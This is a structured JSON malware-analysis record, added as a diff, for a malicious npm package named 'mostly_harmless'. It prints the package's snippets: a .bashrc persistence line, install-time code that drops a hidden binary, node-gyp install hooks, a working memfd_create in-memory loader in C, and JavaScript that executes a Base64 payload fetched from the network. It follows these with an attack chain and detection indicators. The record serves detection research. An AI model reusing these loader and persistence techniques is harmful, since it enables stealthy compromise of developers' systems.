@@ -1,0 +1,226 @@
+{
+  "package_info": {
+    "package_name": "mostly_harmless",
+    "package_manager": "npm",
+    "package_versions": "unspecified (all versions as described in the article)",
+    "why_malicious": "The package is malicious because it establishes persistence on the victim system, exfiltrates credentials, and enables arbitrary code execution via in-memory reflective loading, all without user consent. It leverages postinstall scripts, modifies user startup files, and uses native extensions to evade detection and forensics."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "install script (JavaScript, part of package installation)",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "nohup ~/.mostly_harmless/persist &",
+      "code_language": "shell",
+      "code_behavior": "During installation, the code appends a command to the user's .bashrc to launch a malicious binary on every login, establishing persistence.",
+      "malice_analysis": {
+        "why_suspicious": "Appending commands to .bashrc to run hidden binaries is a classic persistence technique used by malware.",
+        "violated_expectations": "Legitimate packages should not modify user shell startup files to launch hidden binaries.",
+        "similar_legitimate_use": "Some legitimate software may add environment variables or aliases to .bashrc, but not hidden binaries.",
+        "key_indicators": [
+          "Modifies .bashrc",
+          "Runs hidden binary from user home directory"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "install script (JavaScript)",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "const fs = require(\"fs\");\nconst pushFile = (contents, path = \"~/.mostly_harmless\") => {\n    if(!fs.existsSync(path))\n    fs.mkdirSync(path)\n    const full_path = path + \"/persist\";\n    fs.writeFileSync(full_path, contents);\n};",
+      "code_language": "javascript",
+      "code_behavior": "During installation, the code creates a hidden directory in the user's home folder and writes a malicious binary to it for later execution.",
+      "malice_analysis": {
+        "why_suspicious": "Creating hidden directories and writing binaries during install is a common malware tactic.",
+        "violated_expectations": "Normal packages should not drop hidden executables in user directories.",
+        "similar_legitimate_use": "Some developer tools may create hidden folders for configuration, but not for executable persistence.",
+        "key_indicators": [
+          "Creates hidden directory",
+          "Writes executable binary"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "install script (JavaScript, 'end' event handler)",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "res.on(\"end\", () => {\n    fs.appendFileSync(\"~/.bashrc\", rc_updates);\n    // Changed from `eval(tmp)`\n    pushFile(tmp);\n});",
+      "code_language": "javascript",
+      "code_behavior": "At the end of a network response, the code appends persistence commands to .bashrc and writes a malicious payload to disk.",
+      "malice_analysis": {
+        "why_suspicious": "Combining network-retrieved payloads with persistence mechanisms is a hallmark of malware.",
+        "violated_expectations": "Legitimate packages should not modify .bashrc or write arbitrary payloads from the network.",
+        "key_indicators": [
+          "Appends to .bashrc",
+          "Writes network-fetched payload to disk"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall (via node-gyp build)",
+        "file_location": "package.json (scripts.install), binding.gyp, native extension source (lib/mostlyharmless.cc)",
+        "required_permissions": [
+          "filesystem",
+          "native_code_execution"
+        ]
+      },
+      "code_snippet": "{\n    // ...\n    \"scripts\": {\n        // ...\n        \"install\": \"node-gyp rebuild\"\n    },\n    \"gypfile\": true\n}\n\n{\n    \"targets\": [\n        {\n            \"target_name\": \"mostlyharmless\"\n            \"sources\": [\"lib/mostlyharmless.cc\"]\n        }\n    ]\n}",
+      "code_language": "json (package.json, binding.gyp)",
+      "code_behavior": "During installation, the package builds and loads a native Node.js extension, enabling execution of arbitrary native code.",
+      "malice_analysis": {
+        "why_suspicious": "Building native extensions at install time is a common way to introduce hard-to-detect malicious code.",
+        "violated_expectations": "Most packages do not require native code for simple tasks, especially not for postinstall scripts.",
+        "similar_legitimate_use": "Legitimate packages with performance needs may use native extensions, but not for persistence or code execution.",
+        "key_indicators": [
+          "Triggers node-gyp build on install",
+          "Loads native code from hidden source"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (when invoked from JavaScript)",
+        "file_location": "lib/mostlyharmless.cc (native extension)",
+        "required_permissions": [
+          "native_code_execution",
+          "process_control"
+        ]
+      },
+      "code_snippet": "#include <node.h>\nnamespace mostly_harmless {\n    void run(const v8::FunctionCallbackInfo<v8::Value>& args)\n    {\n        // TODO: Bad stuff.\n    void init(v8::Local<v8::Object> exports)\n    {\n        NODE_SET_METHOD(exports, \"run\", run);\n    }\n    NODE_MODULE(NODE_GYP_MODULE_NAME, init)\n}",
+      "code_language": "c++",
+      "code_behavior": "At runtime, the native extension exposes a 'run' method to JavaScript, enabling execution of arbitrary native code, including reflective loading.",
+      "malice_analysis": {
+        "why_suspicious": "Exposing arbitrary native execution to JavaScript is highly dangerous and unnecessary for most packages.",
+        "violated_expectations": "Normal extensions expose specific, well-documented APIs, not generic code execution.",
+        "key_indicators": [
+          "Generic 'run' method",
+          "No legitimate documented API"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "runtime (when 'run' is called from JavaScript)",
+        "file_location": "lib/mostlyharmless.cc (native extension)",
+        "required_permissions": [
+          "native_code_execution",
+          "process_control",
+          "memory"
+        ]
+      },
+      "code_snippet": "int run_reflective(const void* buf, size_t size)\n{\n    char path[32] = {0};\n    int status = 0;\n    int fd = 0;\n    // Attempt to create an anonymous file\n    if(0 > (fd = syscall(__NR_memfd_create, \"\", 0x01))) {\n        return -1;\n    }\n    // Write our executable buffer to the FD\n    if(0 > write(fd, buf, size)) {\n        status = -2;\n        goto cleanup;\n    }\n    // Set the file path so that we can execute\n    // our file by descriptor\n    snprintf(path, sizeof(path), \"/proc/self/fd/%d\", fd);\n    status = fork_exec_file(path);\n    cleanup:\n    close(fd);\n    return status;\n}",
+      "code_language": "c",
+      "code_behavior": "At runtime, the code creates an in-memory file using memfd_create, writes a malicious payload to it, and executes it via fork/exec, achieving in-memory (reflective) code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Reflective in-memory execution is a sophisticated malware technique to evade disk forensics.",
+        "violated_expectations": "Legitimate code rarely needs to execute arbitrary in-memory binaries from user-supplied buffers.",
+        "similar_legitimate_use": "Some security tools or debuggers may use memfd for sandboxing, but not for arbitrary code execution.",
+        "key_indicators": [
+          "Uses memfd_create syscall",
+          "Executes code from memory, not disk"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_7",
+      "execution_context": {
+        "trigger": "runtime (when network payload is received)",
+        "file_location": "JavaScript code using the native extension",
+        "required_permissions": [
+          "network",
+          "native_code_execution"
+        ]
+      },
+      "code_snippet": "res.on(\"end\", () => {\n    let buf = new Buffer(tmp, 'base64');\n    mh.run(buf, buf.length);\n});",
+      "code_language": "javascript",
+      "code_behavior": "At the end of a network response, the code decodes a Base64-encoded binary payload and passes it to the native extension for in-memory execution.",
+      "malice_analysis": {
+        "why_suspicious": "Decoding and executing network-fetched binaries in-memory is a clear sign of malware.",
+        "violated_expectations": "Normal packages should not fetch, decode, and execute arbitrary binaries from the network.",
+        "key_indicators": [
+          "Decodes Base64 payload from network",
+          "Executes via native extension"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious package is installed, triggering postinstall scripts.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Persistence and setup of native extension for further attacks"
+    },
+    {
+      "step": 2,
+      "action": "Persistence is established by modifying .bashrc to launch a hidden binary on user login.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Malicious code runs on every user session"
+    },
+    {
+      "step": 3,
+      "action": "Native extension is built and loaded, exposing arbitrary code execution capabilities.",
+      "implemented_by": [
+        "snippet_4",
+        "snippet_5"
+      ],
+      "leads_to": "Enables in-memory execution of further payloads"
+    },
+    {
+      "step": 4,
+      "action": "Malicious payloads are fetched from the network, decoded, and executed in-memory using memfd_create.",
+      "implemented_by": [
+        "snippet_6",
+        "snippet_7"
+      ],
+      "leads_to": "Arbitrary attacker-controlled code runs in-memory, evading disk forensics"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Modification of user .bashrc to launch hidden binaries",
+      "Creation of hidden directories and binaries in user home",
+      "Building and loading of native extensions during install",
+      "In-memory execution of binaries using memfd_create",
+      "Decoding and executing network-fetched payloads"
+    ],
+    "file_indicators": [
+      "~/.mostly_harmless/persist",
+      "References to .bashrc modifications",
+      "Presence of binding.gyp and native extension source files (lib/mostlyharmless.cc)"
+    ],
+    "network_indicators": [
+      "Outbound network requests to fetch payloads (domain/URL may vary)",
+      "Base64-encoded payloads delivered over HTTP(S)"
+    ],
+    "how_to_detect": "Monitor for npm packages that modify user shell startup files (e.g., .bashrc), create hidden directories or binaries in user home, or build native extensions at install time. Flag any use of memfd_create or execution of code from /proc/self/fd/* paths. Detect network activity where binaries are fetched, decoded, and executed in-memory. Correlate these behaviors for high-confidence detection of in-memory loader malware."
+  }
+}
